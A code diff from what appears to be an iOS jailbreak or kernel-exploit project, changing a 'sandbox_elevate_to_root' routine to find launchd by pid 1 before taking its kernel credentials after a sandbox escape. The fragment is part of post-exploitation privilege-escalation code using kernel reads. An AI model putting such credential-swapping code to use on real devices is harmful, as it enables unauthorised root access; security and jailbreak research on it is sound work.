@@ -246,18 +246,16 @@ static uint64_t sbx_ucredbyproc(uint64_t proc) {
 }
 
 int sandbox_elevate_to_root(uint64_t self_proc) {
-    uint64_t launchd = proc_find_by_name("launchd");
+    // proc_find_by_name walks the entire proc list reading names via kread —
+    // after sandbox_escape one of those reads can land on a bad pointer → crash.
+    // proc_find(1) is safe: it stops as soon as it finds pid 1 (launchd),
+    // which is always near the head of the list.
+    uint64_t launchd = proc_find(1);
     if (!launchd || launchd == (uint64_t)-1) {
-        NSLog(@"[SBX] elevate: procbyname(\"launchd\") failed; trying pid 1 fallback");
-        launchd = proc_find(1);
-        if (launchd && launchd != (uint64_t)-1) {
-            NSLog(@"[SBX] elevate: resolved launchd via pid 1 fallback: 0x%llx", launchd);
-        }
-    }
-    if (!launchd || launchd == (uint64_t)-1) {
-        NSLog(@"[SBX] elevate: could not find launchd");
+        NSLog(@"[SBX] elevate: could not find launchd (pid 1)");
         return -1;
     }
+    NSLog(@"[SBX] elevate: launchd proc: 0x%llx", launchd);
 
     uint64_t launchducred = sbx_ucredbyproc(launchd);
     if (!launchducred) {
